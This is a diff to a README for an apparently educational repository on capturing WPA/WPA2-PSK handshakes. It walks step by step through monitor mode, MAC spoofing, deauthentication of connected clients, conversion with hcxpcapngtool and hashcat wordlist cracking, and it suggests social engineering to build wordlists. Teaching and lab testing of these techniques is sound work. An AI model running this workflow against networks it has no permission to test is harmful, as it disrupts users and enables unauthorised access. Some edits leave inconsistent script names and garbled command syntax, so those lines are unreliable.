@@ -1,5 +1,6 @@
 # WPA/WPA2-PSK Handshake Capture and Analysis
 
+
 ## Overview
 
 This repository contains an educational workflow for capturing WPA/WPA2-PSK handshakes and preparing them for offline analysis with hashcat. The provided scripts enable monitor mode, capture wireless traffic, convert captured handshakes into hashcat-compatible format, and restore normal Wi-Fi operation.
@@ -8,12 +9,9 @@ This repository contains an educational workflow for capturing WPA/WPA2-PSK hand
 
 ## Repository Contents
 
-- `Enable_Monitor_Mode.sh` — enable monitor mode on the wireless interface and randomize the MAC address
-- `Disable_Monitor_Mode.sh` — disable monitor mode and restore network services
-- `StepToFollow.txt` — capture procedure notes
-- `handshake/` — stored handshake capture files
-- `wordlist/` — dictionaries and wordlists
-- `README.md` — project documentation
+- `Enable_monitor_mode.sh` — enable monitor mode on the wireless interface and randomize the MAC address
+- `Restore_managed_mode.sh` — disable monitor mode and restore network services
+- `README.md` — project documentation, procedure, and screenshots
 
 ## Requirements
 
@@ -26,7 +24,19 @@ This repository contains an educational workflow for capturing WPA/WPA2-PSK hand
   - `macchanger`
   - `iw`
 
-Install the tools with:
+
+## Getting Started
+
+To test this repository locally, clone it and run the provided scripts on a compatible Linux system:
+
+```bash
+git clone https://github.com/<your-user>/coffecopy.git
+cd coffecopy
+chmod +x Enable_Monitor_Mode.sh Disable_Monitor_Mode.sh
+```
+
+
+Then install the required tools with:
 
 ```bash
 sudo apt update
@@ -43,15 +53,23 @@ Run:
 iw dev
 ```
 
+```md
+![Command output](screenshots/0-interface.png)
+```
+
+
 Note the interface name, for example `wlan0` or `wlp2s0`.
 
 ### 2. Enable monitor mode
 
-Make the script executable and run it:
+Run the executable script: 
 
 ```bash
-chmod +x Enable_Monitor_Mode.sh
-sudo ./Enable_Monitor_Mode.sh
+sudo ./Enable_monitor_mode.sh
+```
+
+```md
+![Monitor mode enabled](screenshots/1-monitor-mode.png)
 ```
 
 Expected behavior:
@@ -69,12 +87,16 @@ Run:
 sudo airodump-ng wlan0mon
 ```
 
+```md
+![Scan output](screenshots/2-scan.png)
+```
+
 Look for target networks with:
 
 - `ENC: WPA` or `WPA2`
 - `AUTH: PSK`
 
-Avoid networks labeled `AUTH: SAE` or any Enterprise authentication.
+Avoid networks labeled `AUTH: SAE` or any Enterprise authentication, those can't be targeted with this method.
 
 ### 4. Start a targeted capture
 
@@ -84,6 +106,12 @@ Stop the general scan with `Ctrl+C` and then run:
 sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> -w capture wlan0mon
 ```
 
+
+```md
+![Targeted Network scan output](screenshots/3-target-scan.png)
+```
+
+
 Replace `<BSSID>` with the access point MAC address and `<CHANNEL>` with the network channel.
 
 ### 5. Force a client to reconnect
@@ -91,8 +119,13 @@ Replace `<BSSID>` with the access point MAC address and `<CHANNEL>` with the net
 In a second terminal, send deauthentication frames:
 
 ```bash
-sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+sudo aireplay-ng --deauth 10 <Number of Deauth packets> -a <BSSID> -c <Connected Client BSSID> -D <Disable Access Point detection, optional> wlan0mon
 ```
+
+```md
+![Deauth output and the related captured handshake](screenshots/4-deauth-and-captured-handshake.png)
+```
+
 
 This may trigger a connected client to reconnect and generate the WPA handshake.
 
@@ -106,7 +139,17 @@ WPA handshake: <BSSID>
 
 The capture file is usually saved as `capture-01.cap`.
 
-### 7. Convert the capture to hashcat format
+
+### 7 Verify the handshake capture with:
+
+```bash
+aircrack-ng capture-01.cap
+```
+
+![Handshake Check](screenshots/6-aircrack-ng-EAPOL-check.png)
+
+
+### 8. Convert the capture to hashcat format
 
 Convert the captured handshake file with:
 
@@ -114,13 +157,10 @@ Convert the captured handshake file with:
 hcxpcapngtool -o handshake.hc22000 capture-01.cap
 ```
 
-Verify the handshake capture with:
+![Conversion into .hc22000 format](screenshots/7-conversion.png)
 
-```bash
-aircrack-ng capture-01.cap
-```
 
-### 8. Crack the handshake with hashcat
+### 9. Crack the handshake with hashcat
 
 Use a wordlist, for example `rockyou.txt`:
 
@@ -133,46 +173,44 @@ Show cracked results with:
 ```bash
 hashcat -m 22000 handshake.hc22000 --show
 ```
+![Hashcat output](screenshots/8-crack.png)
 
-### 9. Restore the network
+
+### 10. Restore the network
 
 When testing is complete, disable monitor mode:
 
 ```bash
-chmod +x Disable_Monitor_Mode.sh
-sudo ./Disable_Monitor_Mode.sh
+sudo ./Restore_managed_mode.sh
 ```
 
 This script should stop monitor mode and restart the network manager.
 
 ## Notes
 
+- It's not sure that you will capture the handshake
 - Results depend entirely on the quality of the wordlist.
 - Strong passwords or random passphrases are not likely to be cracked with this method.
+- Use Social Engineering to create a custom wordlist, it work's better than a random one.
 - Use this repository only on networks you own or explicitly have permission to test.
 
-## Optional additions
-
-If you want to improve the repository for GitHub, consider adding:
-
-- `LICENSE` — an open source license such as MIT.
-- `CONTRIBUTING.md` — contribution instructions for other users.
-- `screenshots/` — example images showing each step.
-- detailed descriptions of `handshake/` and `wordlist/` contents.
 
 ## Screenshot guidance
 
-If you add screenshots, use these examples:
 
 - `0-interface.png` — output of `iw dev`
 - `1-monitor-mode.png` — monitor mode enabled
 - `2-scan.png` — `airodump-ng` listing a WPA/WPA2-PSK network
-- `3-deauth.png` — `aireplay-ng` sending deauth packets
-- `4-handshake.png` — `airodump-ng` showing `WPA handshake:`
-- `5-conversion.png` — successful `hcxpcapngtool` output
-- `6-crack.png` — `hashcat` showing cracked results
+- `3-target-scan.png` — `airodump-ng` on the specific WPA/WPA2 network
+- `4-deauth-and-captured-handshake.png` — `aireplay-ng` sending deauth packets and `airodump-ng` that show the lost frame and the captured handshake
+- `5-handshake.png` — `airodump-ng` showing `WPA handshake:`
+- `6-aircrack-ng-EAPOL-check.png` — successful `hcxpcapngtool` output
+- `7-conversion.png` — successful `hcxpcapngtool` output
+- `8-crack.png` — `hashcat` showing cracked results
 
 ## Legal and ethical notice
+
+All the analysis was tested on my personal network and in a isolated enviroment. 
 
 This repository is intended for educational use only.
 
